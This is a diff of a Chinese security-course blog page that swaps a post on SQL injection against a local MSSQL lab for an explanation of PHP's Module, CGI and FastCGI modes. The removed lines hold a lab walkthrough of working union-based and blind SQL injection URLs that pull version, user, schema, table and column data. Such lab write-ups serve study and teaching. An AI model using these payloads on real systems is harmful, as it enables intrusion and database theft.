@@ -4,10 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Access数据库的union查询, Evolyutsiya">
-    <meta name="description" content="环境在win2008上搭建的 mssql-sqli-labs环境目标：Lab1，判断为 ‘ 注入
-步骤1。order by 3 确定有 3 列2。
-http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
+    <meta name="keywords" content="PHP的Module、CGI和FASTCGI三种工作模式, Evolyutsiya">
+    <meta name="description" content="静态和动态网站静态网站全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站。所有的内容包含在网页文件中。网页可以出现各种视觉动态效果，eg：GIF动画、FLASH动画、滚动字幕等，网站主要是静态化的页面和代码组成，一般文件名均以h">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +13,7 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Access数据库的union查询 | Evolyutsiya</title>
+    <title>PHP的Module、CGI和FASTCGI三种工作模式 | Evolyutsiya</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -276,13 +274,13 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Access数据库的union查询
+                        PHP的Module、CGI和FASTCGI三种工作模式
                     </div>
                 </div>
             </div>
@@ -393,12 +391,12 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/第八周/" target="_blank">
-                                <span class="chip bg-color">第八周</span>
+                            <a href="/tags/第十周/" target="_blank">
+                                <span class="chip bg-color">第十周</span>
                             </a>
                         
-                            <a href="/tags/SQL注入/" target="_blank">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/PHP/" target="_blank">
+                                <span class="chip bg-color">PHP</span>
                             </a>
                         
                     </div>
@@ -413,10 +411,6 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
                                 i春秋
                             </a>
                         
-                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
-                                SQL注入
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -425,21 +419,21 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-07
+                    2019-09-22
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        745
+                        600
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        2 分
                     </div>
                     
                 
@@ -455,34 +449,14 @@ http://192.168.75.133/less-1.asp?id=1&amp;#39; uni">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在win2008上搭建的 mssql-sqli-labs环境<br>目标：Lab1，判断为 ‘ 注入</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1。order by 3 确定有 3 列<br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025435888.png" alt><br>2。</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; –</code></pre><p><strong>mssql数字和字符串不能一起使用</strong><br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025600225.png" alt><br>3。查询版本</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@version --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025642305.png" alt><br>4。获database()名称</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,db_name()--</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025724663.png" alt><br>5。获取当前用户名</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025802728.png" alt></p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,system_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025823400.png" alt></p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,current_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025842366.png" alt></p>
-<pre><code>获取服务器主机信息
-http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@servername  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025910932.png" alt><br>6。查询库名</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select count(schema_name) from information_schema.schemata)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025951185.png" alt></p>
-<pre><code>然后依次导出
-http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 schema_name from information_schema.schemata where schema_name not in (&#39;dbo&#39;,&#39;db_accessadmin&#39;,&#39;db_backupoperator&#39;,&#39;db_datareader&#39;,&#39;db_datawriter&#39;,&#39;db_ddladmin&#39;,&#39;db_denydatareader&#39;,&#39;db_denydatawriter&#39;,&#39;db_owner&#39;,&#39;db_securityadmin&#39;,&#39;guest&#39;,&#39;INFORMATION_SCHEMA&#39;,&#39;sys&#39;))  --</code></pre><p>7。找表名</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables  )  -- </code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030312129.png" alt></p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;)  )  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030335203.png" alt></p>
-<pre><code>依次类推爆出四个表
-http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;,&#39;uagents&#39;,&#39;referers&#39;,&#39;users&#39;)  )  --</code></pre><p>8。爆表中的列</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where table_name=&#39;emails&#39;)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030423979.png" alt></p>
-<pre><code>依次爆出字段
-http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where column_name not in (&#39;id&#39;,&#39;email_id&#39;,&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;,&#39;referer&#39;,&#39;password&#39;))  --</code></pre><p>9。以emails表为例</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1id from emails)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030535374.png" alt></p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><h2 id="盲注查询version"><a href="#盲注查询version" class="headerlink" title="盲注查询version"></a>盲注查询version</h2><p>1。确定version()字符串长度</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030706821.png" alt><br>2。取单个字符进行ASCII比较</p>
-<pre><code>http://192.168.75.133/less-1.asp?id=1&#39; and ascii(substring(@@version,1,1)) &gt; 76 –
-确定是77，M依次类推（简便的方式使用union查看单个ascii快速确定字符串
-http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,ascii(substring(@@version,1,1))  --
-）</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030754284.png" alt><br>最终确定version字符</p>
-<pre><code>    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)</code></pre>
+                <h1 id="静态和动态网站"><a href="#静态和动态网站" class="headerlink" title="静态和动态网站"></a>静态和动态网站</h1><h2 id="静态网站"><a href="#静态网站" class="headerlink" title="静态网站"></a>静态网站</h2><p>全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站。所有的内容包含在网页文件中。网页可以出现各种视觉动态效果，eg：GIF动画、FLASH动画、滚动字幕等，网站主要是静态化的页面和代码组成，一般文件名均以htm、html、shtml等为后缀</p>
+<h2 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h2><p>当客户端请求时执行网页程序脚本，将程序执行结果返回给客户端。eg：PHP、JSP、ASP等，都是比较常见的动态网页程序。</p>
+<h1 id="PHP的启动"><a href="#PHP的启动" class="headerlink" title="PHP的启动"></a>PHP的启动</h1><h2 id="Zend引擎"><a href="#Zend引擎" class="headerlink" title="Zend引擎"></a>Zend引擎</h2><p>1。分析PHP代码将其转换为Zend Opcode格式，并存储在内存中<br>2。之后执行这些转换后的opcode（opcode：一种PHP脚本编译后的中间语言，加快php的执行速度）</p>
+<h3 id="Zend执行php代码的流程"><a href="#Zend执行php代码的流程" class="headerlink" title="Zend执行php代码的流程"></a>Zend执行php代码的流程</h3><p>1。扫描  将PHP代码转换为语言片断（Tokens）<br>2。分析  将Tokens转换成简单而有意义的表达式<br>3。编译  将表达式编译成opcode<br>4。执行  顺次执行opcode，每次一条</p>
+<h1 id="PHP结合Apache的三种方式"><a href="#PHP结合Apache的三种方式" class="headerlink" title="PHP结合Apache的三种方式"></a>PHP结合Apache的三种方式</h1><h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><p>php作为Apache的模块，当php页面请求时，Apache加载php模块，加载资源并执行php程序，将执行结果返回给客户端。</p>
+<h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>CGI一个协议，实现Web服务程序和解释器通讯。<br>PHP作为一个独立的程序，当有PHP页面的请求时，Apache通过CGI方式启动一个PHP进程，PHP进程获取资源并执行后，将执行结果返回给Apache，Apache返回客户端，执行Apache销毁该进程。</p>
+<h2 id="FASTCGI"><a href="#FASTCGI" class="headerlink" title="FASTCGI"></a>FASTCGI</h2><p>FASTCGI是CGI协议的一个扩展，可以实现将PHP作为一个独立进程，由PHP自身实现进程的创建和销毁。<br>PHP作为一个独立程序，根据配置文件事前规定默认启动进程数、最大启动进程数、最小启动进程数等，当有PHP页面请求时，Apache通过代理方式使用FastCGI协议请求发送给PHP进程，并指定PHP网页文件所在的位置（URL），PHP进程接收后为其分配一个进程并执行脚本。<br>FASTCGI好处可以使PHP服务器作为一个独立服务器，通过Socket与HTTPD通信，使服务分离，扩展性增强，并且无需像CGI一样需要Apache来控制PHP的启动，提高Apache的工作效率。</p>
+
             </div>
             <hr/>
 
@@ -640,9 +614,9 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Access数据库的union查询》
+                    《PHP的Module、CGI和FASTCGI三种工作模式》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/07/Mssql和Access数据库/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/22/PHP的Module、CGI和FASTCGI模式/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Evolyutsiya
             </a> 采用
@@ -683,7 +657,7 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
         repo: 'blogtalk',
         owner: 'Evolyutsiya',
         admin: "Evolyutsiya",
-        id: '2019-09-07T14-44-11',
+        id: '2019-09-22T15-43-42',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -704,29 +678,30 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/09/07/Mysql和Mssql盲注外带数据的DNS查询方式/">
+                <a href="/2019/09/22/PHP的Module、CGI和FASTCGI模式/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Mysql和Mssql盲注外带数据的DNS查询方式">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="PHP的Module、CGI和FASTCGI三种工作模式">
                         
-                        <span class="card-title">Mysql和Mssql盲注外带数据的DNS查询方式</span>
+                        <span class="card-title">PHP的Module、CGI和FASTCGI三种工作模式</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            鉴于盲注和延时盲注的操作复杂度，使用DNS域名解析，外带数据的方式显得方便不少。
+                            静态和动态网站静态网站全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站。所有的内容包含在网页文件中。网页可以出现各种视觉动态效果，eg：GIF动画、FLASH动画、滚动字幕等，网站主要是静态化的页面和代码组成，一般文件名均以h
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -735,23 +710,20 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
                                     i春秋
                                 </a>
                             
-                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
-                                    SQL注入
-                                </a>
-                            
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/第八周/" target="_blank">
-                        <span class="chip bg-color">第八周</span>
+                    <a href="/tags/第十周/" target="_blank">
+                        <span class="chip bg-color">第十周</span>
                     </a>
                     
-                    <a href="/tags/SQL注入/" target="_blank">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
@@ -765,24 +737,24 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/07/SQL宽字节注入/">
+                <a href="/2019/09/22/PHP伪协议/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SQL宽字节注入，使用sqlmap注入">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="PHP伪协议">
                         
-                        <span class="card-title">SQL宽字节注入，使用sqlmap注入</span>
+                        <span class="card-title">PHP伪协议</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            注入原理与数字型和文字型一样,都是在接受用户输入的参数后未能有效的处理用户输入的数据,当数据导入数据库进行查询时产生的漏洞。
+                            php带有的内置URL风格的封装协议，可用于类似fopen()、copy()、file_exits()和filesize() 的文件系统函数。除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-07
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-22
                             </span>
                         <span class="publish-author">
                             
@@ -792,8 +764,8 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
                                     i春秋
                                 </a>
                             
-                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
-                                    SQL注入
+                            <a href="/categories/i春秋/文件包含/" class="post-category" target="_blank">
+                                    文件包含
                                 </a>
                             
                             
@@ -803,12 +775,12 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/第八周/" target="_blank">
-                        <span class="chip bg-color">第八周</span>
+                    <a href="/tags/文件包含/" target="_blank">
+                        <span class="chip bg-color">文件包含</span>
                     </a>
                     
-                    <a href="/tags/SQL注入/" target="_blank">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/第十周/" target="_blank">
+                        <span class="chip bg-color">第十周</span>
                     </a>
                     
                 </div>
@@ -976,7 +948,7 @@ http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">41.3k</span>
+                <span class="white-color">51.5k</span>
             
 
             
